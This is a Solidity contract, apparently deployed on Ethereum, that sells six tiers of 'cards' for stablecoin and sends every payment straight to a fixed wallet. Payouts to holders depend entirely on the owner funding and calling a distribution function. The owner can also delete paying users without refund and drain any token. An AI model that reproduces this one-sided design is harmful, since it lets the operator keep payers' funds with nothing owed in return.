/**
 *Submitted for verification at Etherscan.io on 2023-10-16
*/

// TG: @BR_BIGBOSS DEV Copyrights
// TG: @madapeeth

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract CardDistribution {
    address public owner;
    IERC20 public constant usdtToken = IERC20(0x4Fabb145d64652a948d72533023f6E7A623C7C53);
    address payable public constant receivingWallet = payable(0xfc4bC2A11636c9634613a693e9BBd28A5cFe144D);

    enum CardLevel { NONE, LEVEL1, LEVEL2, LEVEL3, LEVEL4, LEVEL5, LEVEL6 }
    mapping(CardLevel => uint256) public cardPrices;
    mapping(CardLevel => uint256) public distributionPercentages;
    mapping(address => CardLevel) public userCardLevels;
    mapping(CardLevel => address[]) public cardHolders;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    constructor() {
        owner = msg.sender;

        // Set Card Prices
        cardPrices[CardLevel.LEVEL1] = 49e18;
        cardPrices[CardLevel.LEVEL2] = 149e18;
        cardPrices[CardLevel.LEVEL3] = 449e18;
        cardPrices[CardLevel.LEVEL4] = 899e18;
        cardPrices[CardLevel.LEVEL5] = 1199e18;
        cardPrices[CardLevel.LEVEL6] = 1499e18;

        // Set Distribution Percentages
        distributionPercentages[CardLevel.LEVEL1] = 1;
        distributionPercentages[CardLevel.LEVEL2] = 5;
        distributionPercentages[CardLevel.LEVEL3] = 9;
        distributionPercentages[CardLevel.LEVEL4] = 15;
        distributionPercentages[CardLevel.LEVEL5] = 25;
        distributionPercentages[CardLevel.LEVEL6] = 45;
    }

    function checkCardLevel(address user) external view returns (CardLevel) {
        return userCardLevels[user];
    }

    function withdrawStuckETH(uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Insufficient balance");
        payable(owner).transfer(amount);
    }

    function buyOrUpgradeCard() external {
        CardLevel currentLevel = userCardLevels[msg.sender];
        require(currentLevel != CardLevel.LEVEL6, "Already at max level");

        CardLevel nextLevel = CardLevel(uint256(currentLevel) + 1);
        uint256 cardPrice = cardPrices[nextLevel];
        require(usdtToken.transferFrom(msg.sender, receivingWallet, cardPrice), "Transfer failed");

        // If user already has a card, remove them from their current level's cardHolders list
        if (currentLevel != CardLevel.NONE) {
            address[] storage currentHolders = cardHolders[currentLevel];
            for (uint i = 0; i < currentHolders.length; i++) {
                if (currentHolders[i] == msg.sender) {
                    currentHolders[i] = currentHolders[currentHolders.length - 1];
                    currentHolders.pop();
                    break;
                }
            }
        }

        // Update user's card level and add them to the new level's cardHolders list
        userCardLevels[msg.sender] = nextLevel;
        cardHolders[nextLevel].push(msg.sender);
    }

    function distribute(uint256 amount) external onlyOwner {
        for (uint8 i = 1; i <= 6; i++) {
            CardLevel level = CardLevel(i);
            uint256 totalShare = (amount * distributionPercentages[level]) / 100;
            address[] memory holders = cardHolders[level];

            if (holders.length == 0) {
                require(usdtToken.transfer(receivingWallet, totalShare), "Transfer to owner failed");
                continue;
            }

            uint256 individualShare = totalShare / holders.length;
            for (uint j = 0; j < holders.length; j++) {
                require(usdtToken.transfer(holders[j], individualShare), "Distribution failed");
            }
        }
    }

    function removeUser(address user) external onlyOwner {
        CardLevel level = userCardLevels[user];
        require(level != CardLevel.NONE, "User not found");

        address[] storage holders = cardHolders[level];
        for (uint i = 0; i < holders.length; i++) {
            if (holders[i] == user) {
                holders[i] = holders[holders.length - 1];
                holders.pop();
                break;
            }
        }
        delete userCardLevels[user];
    }

    function retrieveTokens(address token, uint256 amount) external onlyOwner {
        IERC20(token).transfer(owner, amount);
    }
}